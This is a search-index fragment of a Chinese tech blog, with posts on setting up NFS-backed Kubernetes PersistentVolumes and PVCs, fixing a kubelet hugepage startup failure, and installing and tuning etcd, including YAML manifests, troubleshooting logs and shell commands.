\u003cnone\u003e Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: yes Finalizers: [kubernetes.io/pvc-protection] Capacity: 1Mi Access Modes: RWX VolumeMode: Filesystem Used By: nfs-busybox-b8wdw nfs-busybox-hvc8w nfs-web-7bnhj nfs-web-mxpx9 Events: \u003cnone\u003e ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:5:3","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"部署 # create nfs server kubectl create -f nfs/custom-nfs-server-rc.yaml kubectl create -f nfs/nfs-server-service.yaml # create nfs pv pvc kubectl create -f nfs/custom-nfs-pv.yaml kubectl create -f nfs/custom-nfs-pvc.yaml # create busybox write kubectl create -f nfs/custom-nfs-busybox-rc.yaml # create web read kubectl create -f nfs/nfs-web-rc.yaml kubectl create -f nfs/nfs-web-service.yaml ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:5:4","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"卸载 # remove web read kubectl delete -f nfs/nfs-web-service.yaml kubectl delete -f nfs/nfs-web-rc.yaml # remove busybox write kubectl delete -f nfs/custom-nfs-busybox-rc.yaml # remove nfs pv pvc kubectl delete -f nfs/nfs-pvc.yaml kubectl delete -f nfs/custom-nfs-pv.yaml # remove nfs server kubectl delete -f nfs/nfs-server-service.yaml kubectl delete -f nfs/custom-nfs-server-rc.yaml ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:5:5","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"问题 启动测试pod，进行mount时失败 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 26s default-scheduler Successfully assigned default/nfs-busybox-jwshl to node131 Warning FailedMount 11s (x6 over 27s) kubelet MountVolume.SetUp failed for volume \"nfs\" : mount failed: exit status 32 Mounting command: mount Mounting arguments: -t nfs nfs-server.default.svc.cluster.local:/tmp/data /var/lib/kubelet/pods/d4ca8ca9-e1c8-4610-8a74-f0fdea827fee/volumes/kubernetes.io~nfs/nfs Output: mount: 文件系统类型错误、选项错误、nfs-server.default.svc.cluster.local:/tmp/data 上有坏超级块、 缺少代码页或助手程序，或其他错误 (对某些文件系统(如 nfs、cifs) 您可能需要 一款 /sbin/mount.\u003c类型\u003e 助手程序) 有些情况下在 syslog 中可以找到一些有用信息- 请尝试 dmesg | tail 这样的命令看看。 首先检查 内核是否支持nfs文件系统格式，方法如下 cat /proc/filesystems 如果能够看到 nfs 或者nfs4字样就说明内核支持nfs格式的文件系统，否则需要重新编译新的支持nfs文件系统的内核。 如果检查内核支持nfs格式的文件系统后，检查mount.nfs是否安装： ls /sbin/mount.* 看是否有 mount.nfs 或者 mount.nfs4 如果没有需要安装 nfs_utils ls /sbin/mount.* yum install nfs-utils (redhat系列) yum install -y nfs-utils apt-get install common(ubuntu系列) apt-get install nfs-common 挂载域名无法解析，使用ip地址标识 ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:6:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Output: mount.nfs: Protocol not supported Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 28s default-scheduler Successfully assigned default/nfs-busybox-k6dpc to node131 Warning FailedMount 11s (x6 over 27s) kubelet MountVolume.SetUp failed for volume \"nfs\" : mount failed: exit status 32 Mounting command: mount Mounting arguments: -t nfs 10.233.124.49:/tmp/data /var/lib/kubelet/pods/e5932fde-fe05-4612-b29d-333f48b03338/volumes/kubernetes.io~nfs/nfs Output: mount.nfs: Protocol not supported [root@node131 nfs]# https://stackoverflow.com/questions/35650935/output-mount-nfs-requested-nfs-version-or-transport-protocol-is-not-supported ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:6:1","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"访问挂载路径，服务端access denied Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal Scheduled 33s default-scheduler Successfully assigned default/nfs-busybox-4ht5m to node131 Warning FailedMount 1s (x7 over 34s) kubelet MountVolume.SetUp failed for volume \"nfs\" : mount failed: exit status 32 Mounting command: mount Mounting arguments: -t nfs 10.233.124.49:/ /var/lib/kubelet/pods/bd34361c-4883-47a2-9e70-08772437e341/volumes/kubernetes.io~nfs/nfs Output: mount.nfs: access denied by server while mounting 10.233.124.49:/ [root@node131 nfs]# 原因挂载路径错误 pv配置的挂载路径path需跟nfs服务定义的路径一致。 nfs:#server: nfs-server.default.svc.cluster.localserver:10.233.124.49path:\"/exports\" ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:6:2","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"附录 按服务和资源配置顺序，依次如下 ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:7:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"custom-nfs-server-rc.yaml apiVersion:v1kind:ReplicationControllermetadata:name:nfs-serverspec:replicas:1selector:role:nfs-servertemplate:metadata:labels:role:nfs-serverspec:containers:- name:nfs-serverimage:k8s.gcr.io/volume-nfs:0.8ports:- name:nfscontainerPort:2049- name:mountdcontainerPort:20048- name:rpcbindcontainerPort:111securityContext:privileged:truevolumeMounts:- mountPath:/exports# name: mypvcname:data-volumevolumes:# - name: mypvc# persistentVolumeClaim:# claimName: nfs-pv-provisioning-demo- name:data-volume #卷名hostPath:path:/tmp/data ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:7:1","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"custom-nfs-pv.yaml apiVersion:v1kind:PersistentVolumemetadata:name:nfsspec:capacity:storage:1MiaccessModes:- ReadWriteMany#- ReadWriteOncenfs:# faild: nfs-server svc name#server: nfs-server.default.svc.cluster.local# success: nfs-server svc ipserver:10.233.16.102path:\"/exports\" ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:7:2","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"custom-nfs-pvc.yaml apiVersion:v1kind:PersistentVolumeClaimmetadata:name:nfsspec:accessModes:- ReadWriteMany#- ReadWriteOncestorageClassName:\"\"resources:requests:storage:1Mi ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:7:3","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"custom-nfs-busybox-rc.yaml 使用pvc进行nfs存储写操作 # This mounts the nfs volume claim into /mnt and continuously# overwrites /mnt/index.html with the time and hostname of the pod.apiVersion:v1kind:ReplicationControllermetadata:name:nfs-busyboxspec:replicas:2selector:name:nfs-busyboxtemplate:metadata:labels:name:nfs-busyboxspec:containers:- image:busyboxcommand:- sh- -c- 'while true; do date \u003e /mnt/index.html; hostname \u003e\u003e /mnt/index.html; sleep $(($RANDOM % 5 + 5)); done'imagePullPolicy:IfNotPresentname:busyboxvolumeMounts:# name must match the volume name below- name:nfsmountPath:\"/mnt\"volumes:- name:nfspersistentVolumeClaim:claimName:nfs ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:7:4","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"nfs-web-rc.yaml 使用pvc进行nfs存储读操作 # This pod mounts the nfs volume claim into /usr/share/nginx/html and# serves a simple web page.apiVersion:v1kind:ReplicationControllermetadata:name:nfs-webspec:replicas:2selector:role:web-frontendtemplate:metadata:labels:role:web-frontendspec:containers:- name:webimage:nginx:1.19ports:- name:webcontainerPort:80volumeMounts:# name must match the volume name below- name:nfsmountPath:\"/usr/share/nginx/html\"volumes:- name:nfspersistentVolumeClaim:claimName:nfs pv和pvc结构体 // Volume represents a named volume in a pod that may be accessed by any container in the pod. type Volume struct { // Volume's name. // Must be a DNS_LABEL and unique within the pod. // More info: https://kubernetes.io/docs/concepts/overview/working-with-objects/names/#names Name string `json:\"name\" protobuf:\"bytes,1,opt,name=name\"` // VolumeSource represents the location and type of the mounted volume. // If not specified, the Volume is implied to be an EmptyDir. // This implied behavior is deprecated and will be removed in a future version. VolumeSource `json:\",inline\" protobuf:\"bytes,2,opt,name=volumeSource\"` } // Represents the source of a volume to mount. // Only one of its members may be specified. type VolumeSource struct { // HostPath represents a pre-existing file or directory on the host // machine that is directly exposed to the container. This is generally // used for system agents or other privileged things that are allowed // to see the host machine. Most containers will NOT need this. // More info: https://kubernetes.io/docs/concepts/storage/volumes#hostpath // --- // TODO(jonesdl) We need to restrict who can use host directory mounts and who can/can not // mount host directories as read/write. // +optional HostPath *HostPathVolumeSource `json:\"hostPath,omitempty\" protobuf:\"bytes,1,opt,name=hostPath\"` // EmptyDir represents a temporary directory that shares a pod's lifetime. // More info: https://kubernetes.io/docs/concepts/storage/volumes#emptydir // +optional EmptyDir *EmptyDirVolumeSource `json:\"emptyDir,omitempty\" protobuf:\"bytes,2,opt,name=emptyDir\"` // GCEPersistentDisk represents a GCE Disk resource that is attached to a // kubelet's host machine and then exposed to the pod. // More info: https://kubernetes.io/docs/concepts/storage/volumes#gcepersistentdisk // +optional GCEPersistentDisk *GCEPersistentDiskVolumeSource `json:\"gcePersistentDisk,omitempty\" protobuf:\"bytes,3,opt,name=gcePersistentDisk\"` // AWSElasticBlockStore represents an AWS Disk resource that is attached to a // kubelet's host machine and then exposed to the pod. // More info: https://kubernetes.io/docs/concepts/storage/volumes#awselasticblockstore // +optional AWSElasticBlockStore *AWSElasticBlockStoreVolumeSource `json:\"awsElasticBlockStore,omitempty\" protobuf:\"bytes,4,opt,name=awsElasticBlockStore\"` // GitRepo represents a git repository at a particular revision. // DEPRECATED: GitRepo is deprecated. To provision a container with a git repo, mount an // EmptyDir into an InitContainer that clones the repo using git, then mount the EmptyDir // into the Pod's container. // +optional GitRepo *GitRepoVolumeSource `json:\"gitRepo,omitempty\" protobuf:\"bytes,5,opt,name=gitRepo\"` // Secret represents a secret that should populate this volume. // More info: https://kubernetes.io/docs/concepts/storage/volumes#secret // +optional Secret *SecretVolumeSource `json:\"secret,omitempty\" protobuf:\"bytes,6,opt,name=secret\"` // NFS represents an NFS mount on the host that shares a pod's lifetime // More info: https://kubernetes.io/docs/concepts/storage/volumes#nfs // +optional NFS *NFSVolumeSource `json:\"nfs,omitempty\" protobuf:\"bytes,7,opt,name=nfs\"` // ISCSI represents an ISCSI Disk resource that is attached to a // kubelet's host machine and then exposed to the pod. // More info: https://examples.k8s.io/volumes/iscsi/README.md // +optional ISCSI *ISCSIVolumeSource `json:\"iscsi,omitempty\" protobuf:\"bytes,8,opt,name=iscsi\"` // Glusterfs represents a Glusterfs m","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:7:5","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"参考资料 volume概念 persistent-volumes概念 持久存储设计文档 存储类StorageClass 基于运行示例的详细演练 存储卷和数据持久化(Volumes and Persistent Storage) ","date":"2021-02-03","objectID":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/:8:0","tags":["K8S"],"title":"K8S的PV和PVC介绍","uri":"/posts/2021/02/k8s%E7%9A%84pv%E5%92%8Cpvc%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"记录hugepage配置导致k8s的kubelet重启失败问题的排查过程","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"记录hugepage配置导致k8s的kubelet重启失败问题的排查过程 ","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/:0:0","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"问题 kubelet 重启时，发现节点无法注册，错误信息如下： may not have pre-allocated hugepages for multiple page sizes 不支持预分配多种类型的大页。 ","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/:1:0","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"分析 ","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/:2:0","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"问题所在业务流程点 结合kubelet代码分析： kubelet启动时会进行自检，如果已使用的hugepagesize类型数 \u003e 1， 根据nr_hugepages，判断大页是否已使用，如nr_hugepages ！=1， 则无法通过 ","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/:2:1","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"查看系统meminfo cat /proc/meminfo ","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/:2:2","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"查看系统hugepage 查看大页信息，命令如下 # hugepages配置的size大小，如果有多个则会有多行输出 cat /sys/kernel/mm/hugepages/hugepages-*/nr_hugepages # 内核hugepages的配置文件 ls /sys/kernel/mm/hugepages 发现系统已使用了2种类型的大页，如下 [root@worker-01 ~]# cat /sys/kernel/mm/hugepages/hugepages-*/nr_hugepages 2 2560 [root@worker-01 ~]# ls /sys/kernel/mm/hugepages hugepages-1048576kB hugepages-2048kB ","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/:3:0","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["K8S"],"content":"解决方式 需要对一种类型大页，清0处理，比如对1G类型大页处理，该类型的hugepage未使用 echo 0 \u003e /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages 重启kubelet systemctl restart kubelet ","date":"2021-01-29","objectID":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/:4:0","tags":["K8S"],"title":"hugepage配置导致k8s的kubelet重启失败问题","uri":"/posts/2021/01/hugepage%E9%85%8D%E7%BD%AE%E5%AF%BC%E8%87%B4k8s%E7%9A%84kubelet%E9%87%8D%E5%90%AF%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/"},{"categories":["数据库"],"content":"Etcd参数调优配置和对比测试","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"针对etcd的性能指标：延迟(latency)和吞吐量(throughput)，进行Etcd参数调优和对比测试 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:0:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"说明 etcd 提供稳定的，持续的高性能。两个定义性能的因素：延迟(latency)和吞吐量(throughput)。延迟是完成操作的时间。吞吐量是在某个时间期间之内完成操作的总数量。当 etcd 接收并发客户端请求时，通常平均延迟随着总体吞吐量增加而增加。在通常的云环境，比如 Google Compute Engine (GCE) 标准的 n-4 或者 AWS 上相当的机器类型，一个三成员 etcd 集群在轻负载下可以在低于1毫秒内完成一个请求，并在重负载下可以每秒完成超过 30000 个请求。 etcd 使用 Raft 一致性算法来在成员之间复制请求并达成一致。一致性性能，特别是提交延迟，受限于两个物理约束：网络IO延迟和磁盘IO延迟。完成一个etcd请求的最小时间是成员之间的网络往返时延(Round Trip Time / RTT)，加需要提交数据到持久化存储的 fdatasync 时间。在一个数据中心内的 RTT 可能有数百毫秒。在美国典型的 RTT 是大概 50ms, 而在大陆之间可以慢到400ms. 旋转硬盘(注：指传统机械硬盘)的典型 fdatasync 延迟是大概 10ms。对于 SSD 硬盘, 延迟通常低于 1ms. 为了提高吞吐量, etcd 将多个请求打包在一起并提交给 Raft。这个批量策略让 etcd 在重负载时获得高吞吐量. 有其他子系统影响到 etcd 的整体性能。每个序列化的 etcd 请求必须通过 etcd 的 boltdb支持的(boltdb-backed) MVCC 存储引擎,它通常需要10微秒来完成。etcd 定期递增快照它最近实施的请求，将他们和之前在磁盘上的快照合并。这个过程可能导致延迟尖峰(latency spike)。虽然在SSD上这通常不是问题，在HDD上它可能加倍可观察到的延迟。而且，进行中的压缩可以影响 etcd 的性能。幸运的是，压缩通常无足轻重，因为压缩是错开的，因此它不和常规请求竞争资源。RPC 系统，gRPC，为 etcd 提供定义良好，可扩展的 API，但是它也引入了额外的延迟，尤其是本地读取。 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:1:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"etcd 安装 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:2:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"二进制方式安装 参考版本地址 这里选择ETCD_VER=v3.4.13版本 ETCD_VER=v3.4.13 # choose either URL GOOGLE_URL=https://storage.googleapis.com/etcd GITHUB_URL=https://github.com/etcd-io/etcd/releases/download # choose GITHUB_URL DOWNLOAD_URL=${GITHUB_URL} rm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz rm -rf /tmp/etcd-download-test \u0026\u0026 mkdir -p /tmp/etcd-download-test curl -L ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz -o /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz tar xzvf /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz -C /tmp/etcd-download-test --strip-components=1 rm -f /tmp/etcd-${ETCD_VER}-linux-amd64.tar.gz /tmp/etcd-download-test/etcd --version /tmp/etcd-download-test/etcdctl version ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:2:1","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"etcd 启动 # start a local etcd server /tmp/etcd-download-test/etcd ## 指定etcd name /tmp/etcd-download-test/etcd --name=etcdtest ## 指定data-dir /tmp/etcd-download-test/etcd --name=etcdtest --data-dir=/var/lib/etcd ## 指定 params /tmp/etcd-download-test/etcd --name=etcdtest --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:2:2","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"etcd 键值测试 # write,read to etcd /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 put foo bar /tmp/etcd-download-test/etcdctl --endpoints=localhost:2379 get foo ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:2:3","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"etcd 参数优化 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:3:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"快照 etcd_snapshot_count 5000 数据快照触发数量，etcd处理指定的次数的事务提交后，生产数据快照 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:3:1","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"历史数据压缩频率 etcd_compaction_retention 1 由于ETCD数据存储多版本数据，随着写入的主键增加历史版本需要定时清理，　默认的历史数据是不会清理的，数据达到2G就不能写入，必须要清理压缩历史数据才能继续写入； 所以根据业务需求，在上生产环境之前就提前确定，历史数据多长时间压缩一次；　我们的生产环境现在升级后是默认一小时压缩一次数据。这样可以极大的保证集群稳定，减少内存和磁盘占用 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:3:2","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"时间参数 etcd_heartbeat_interval 200 etcd_election_timeout 2000 客户端连接后的心跳间隔（毫秒） 集群选举的超时时间（毫秒） ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:3:3","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"磁盘IO优先级，在全部etcd节点执行 ionice -c2 -n0 -p pgrep etcd ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:3:4","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"etcd配置，环境变量方式 vi /etc/etcd.env vi /etc/etcd.env ETCD_SNAPSHOT_COUNT=5000 ETCD_HEARTBEAT_INTERVAL=200 ETCD_ELECTION_TIMEOUT=2000 ETCD_AUTO_COMPACTION_RETENTION=1 ","date":"2021-01-19","objectID":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/:4:0","tags":["Etcd"],"title":"Etcd调优和性能测试","uri":"/posts/2021/01/etcd%E8%B0%83%E4%BC%98%E5%92%8C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"},{"categories":["数据库"],"content":"etcd配置， 命令行参数方式 etcd --heartbeat-interval=200 --election-timeout=2000 --snapshot-count=5000 --auto-compaction-retention=1 